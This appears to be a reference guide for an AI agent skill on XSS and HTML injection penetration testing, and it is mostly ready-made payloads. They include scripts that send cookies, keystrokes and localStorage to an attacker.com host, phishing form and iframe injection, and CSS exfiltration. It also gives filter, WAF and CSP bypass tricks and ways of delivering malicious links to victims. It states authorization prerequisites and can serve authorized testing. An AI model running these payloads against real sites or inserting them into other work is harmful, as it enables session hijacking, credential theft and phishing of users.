# Cross-Site Scripting and HTML Injection Testing - Detailed Guide

> This file contains the detailed procedure and reference material extracted from `SKILL.md` for focused loading. The root skill defines activation, examples, safety constraints, and limitations.

## Purpose

Execute comprehensive client-side injection vulnerability assessments on web applications to identify XSS and HTML injection flaws, demonstrate exploitation techniques for session hijacking and credential theft, and validate input sanitization and output encoding mechanisms. This skill enables systematic detection and exploitation across stored, reflected, and DOM-based attack vectors.


## Inputs / Prerequisites

### Required Access
- Target web application URL with user input fields
- Burp Suite or browser developer tools for request analysis
- Access to create test accounts for stored XSS testing
- Browser with JavaScript console enabled

### Technical Requirements
- Understanding of JavaScript execution in browser context
- Knowledge of HTML DOM structure and manipulation
- Familiarity with HTTP request/response headers
- Understanding of cookie attributes and session management

### Legal Prerequisites
- Written authorization for security testing
- Defined scope including target domains and features
- Agreement on handling of any captured session data
- Incident response procedures established


## Outputs / Deliverables

- XSS/HTMLi vulnerability report with severity classifications
- Proof-of-concept payloads demonstrating impact
- Session hijacking demonstrations (controlled environment)
- Remediation recommendations with CSP configurations


## Core Workflow

### Phase 1: Vulnerability Detection

#### Identify Input Reflection Points
Locate areas where user input is reflected in responses:

```
# Common injection vectors
- Search boxes and query parameters
- User profile fields (name, bio, comments)
- URL fragments and hash values
- Error messages displaying user input
- Form fields with client-side validation only
- Hidden form fields and parameters
- HTTP headers (User-Agent, Referer)
```

#### Basic Detection Testing
Insert test strings to observe application behavior:

```html
<!-- Basic reflection test -->
<test123>

<!-- Script tag test -->
<script>alert('XSS')</script>

<!-- Event handler test -->
<img src=x onerror=alert('XSS')>

<!-- SVG-based test -->
<svg onload=alert('XSS')>

<!-- Body event test -->
<body onload=alert('XSS')>
```

Monitor for:
- Raw HTML reflection without encoding
- Partial encoding (some characters escaped)
- JavaScript execution in browser console
- DOM modifications visible in inspector

#### Determine XSS Type

**Stored XSS Indicators:**
- Input persists after page refresh
- Other users see injected content
- Content stored in database/filesystem

**Reflected XSS Indicators:**
- Input appears only in current response
- Requires victim to click crafted URL
- No persistence across sessions

**DOM-Based XSS Indicators:**
- Input processed by client-side JavaScript
- Server response doesn't contain payload
- Exploitation occurs entirely in browser

### Phase 2: Stored XSS Exploitation

#### Identify Storage Locations
Target areas with persistent user content:

```
- Comment sections and forums
- User profile fields (display name, bio, location)
- Product reviews and ratings
- Private messages and chat systems
- File upload metadata (filename, description)
- Configuration settings and preferences
```

#### Craft Persistent Payloads

```html
<!-- Cookie stealing payload -->
<script>
document.location='http://attacker.com/steal?c='+document.cookie
</script>

<!-- Keylogger injection -->
<script>
document.onkeypress=function(e){
  new Image().src='http://attacker.com/log?k='+e.key;
}
</script>

<!-- Session hijacking -->
<script>
fetch('http://attacker.com/capture',{
  method:'POST',
  body:JSON.stringify({cookies:document.cookie,url:location.href})
})
</script>

<!-- Phishing form injection -->
<div id="login">
<h2>Session Expired - Please Login</h2>
<form action="http://attacker.com/phish" method="POST">
Username: <input name="user"><br>
Password: <input type="password" name="pass"><br>
<input type="submit" value="Login">
</form>
</div>
```

### Phase 3: Reflected XSS Exploitation

#### Construct Malicious URLs
Build URLs containing XSS payloads:

```
# Basic reflected payload
https://target.com/search?q=<script>alert(document.domain)</script>

# URL-encoded payload
https://target.com/search?q=%3Cscript%3Ealert(1)%3C/script%3E

# Event handler in parameter
https://target.com/page?name="><img src=x onerror=alert(1)>

# Fragment-based (for DOM XSS)
https://target.com/page#<script>alert(1)</script>
```

#### Delivery Methods
Techniques for delivering reflected XSS to victims:

```
1. Phishing emails with crafted links
2. Social media message distribution
3. URL shorteners to obscure payload
4. QR codes encoding malicious URLs
5. Redirect chains through trusted domains
```

### Phase 4: DOM-Based XSS Exploitation

#### Identify Vulnerable Sinks
Locate JavaScript functions that process user input:

```javascript
// Dangerous sinks
document.write()
document.writeln()
element.innerHTML
element.outerHTML
element.insertAdjacentHTML()
eval() <!-- security-allowlist: XSS sink inventory -->
setTimeout()
setInterval()
Function()
location.href
location.assign()
location.replace()
```

#### Identify Sources
Locate where user-controlled data enters the application:

```javascript
// User-controllable sources
location.hash
location.search
location.href
document.URL
document.referrer
window.name
postMessage data
localStorage/sessionStorage
```

#### DOM XSS Payloads

```javascript
// Hash-based injection
https://target.com/page#<img src=x onerror=alert(1)>

// URL parameter injection (processed client-side)
https://target.com/page?default=<script>alert(1)</script>

// PostMessage exploitation
// On attacker page:
<iframe src="https://target.com/vulnerable"></iframe>
<script>
frames[0].postMessage('<img src=x onerror=alert(1)>','*');
</script>
```

### Phase 5: HTML Injection Techniques

#### Reflected HTML Injection
Modify page appearance without JavaScript:

```html
<!-- Content injection -->
<h1>SITE HACKED</h1>

<!-- Form hijacking -->
<form action="http://attacker.com/capture">
<input name="credentials" placeholder="Enter password">
<button>Submit</button>
</form>

<!-- CSS injection for data exfiltration -->
<style>
input[value^="a"]{background:url(http://attacker.com/a)}
input[value^="b"]{background:url(http://attacker.com/b)}
</style>

<!-- iframe injection -->
<iframe src="http://attacker.com/phishing" style="position:absolute;top:0;left:0;width:100%;height:100%"></iframe>
```

#### Stored HTML Injection
Persistent content manipulation:

```html
<!-- Marquee disruption -->
<marquee>Important Security Notice: Your account is compromised!</marquee>

<!-- Style override -->
<style>body{background:red !important;}</style>

<!-- Hidden content with CSS -->
<div style="position:fixed;top:0;left:0;width:100%;background:white;z-index:9999;">
Fake login form or misleading content here
</div>
```

### Phase 6: Filter Bypass Techniques

#### Tag and Attribute Variations

```html
<!-- Case variation -->
<ScRiPt>alert(1)</sCrIpT>
<IMG SRC=x ONERROR=alert(1)>

<!-- Alternative tags -->
<svg/onload=alert(1)>
<body/onload=alert(1)>
<marquee/onstart=alert(1)>
<details/open/ontoggle=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>

<!-- Malformed tags -->
<img src=x onerror=alert(1)//
<img """><script>alert(1)</script>">
```

#### Encoding Bypass

```html
<!-- HTML entity encoding -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>

<!-- Hex encoding -->
<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>

<!-- Unicode encoding -->
<script>\u0061lert(1)</script>

<!-- Mixed encoding -->
<img src=x onerror=\u0061\u006cert(1)>
```

#### JavaScript Obfuscation

```javascript
// String concatenation
<script>eval('al'+'ert(1)')</script> <!-- security-allowlist: controlled XSS obfuscation example -->

// Template literals
<script>alert`1`</script>

// Constructor execution
<script>[].constructor.constructor('alert(1)')()</script>

// Base64 encoding
<script>eval(atob('YWxlcnQoMSk='))</script> <!-- security-allowlist: controlled XSS obfuscation example -->

// Without parentheses
<script>alert`1`</script>
<script>throw/a]a]/.source+onerror=alert</script>
```

#### Whitespace and Comment Bypass

```html
<!-- Tab/newline insertion -->
<img src=x	onerror
=alert(1)>

<!-- JavaScript comments -->
<script>/**/alert(1)/**/</script>

<!-- HTML comments in attributes -->
<img src=x onerror="alert(1)"<!--comment-->
```


## Quick Reference

### XSS Detection Checklist
```
1. Insert <script>alert(1)</script> → Check execution
2. Insert <img src=x onerror=alert(1)> → Check event handler
3. Insert "><script>alert(1)</script> → Test attribute escape
4. Insert javascript:alert(1) → Test href/src attributes
5. Check URL hash handling → DOM XSS potential
```

### Common XSS Payloads

| Context | Payload |
|---------|---------|
| HTML body | `<script>alert(1)</script>` |
| HTML attribute | `"><script>alert(1)</script>` |
| JavaScript string | `';alert(1)//` |
| JavaScript template | `${alert(1)}` |
| URL attribute | `javascript:alert(1)` |
| CSS context | `</style><script>alert(1)</script>` |
| SVG context | `<svg onload=alert(1)>` |

### Cookie Theft Payload
```javascript
<script>
new Image().src='http://attacker.com/c='+btoa(document.cookie);
</script>
```

### Session Hijacking Template
```javascript
<script>
fetch('https://attacker.com/log',{
  method:'POST',
  mode:'no-cors',
  body:JSON.stringify({
    cookies:document.cookie,
    localStorage:JSON.stringify(localStorage),
    url:location.href
  })
});
</script>
```


## Troubleshooting

| Issue | Solutions |
|-------|-----------|
| Script not executing | Check CSP blocking; verify encoding; try event handlers (img, svg onerror); confirm JS enabled |
| Payload appears but doesn't execute | Break out of attribute context with `"` or `'`; check if inside comment; test different contexts |
| Cookies not accessible | Check HttpOnly flag; try localStorage/sessionStorage; use no-cors mode |
| CSP blocking payloads | Find JSONP on whitelisted domains; check for unsafe-inline; test base-uri bypass |
| WAF blocking requests | Use encoding variations; fragment payload; null bytes; case variations |
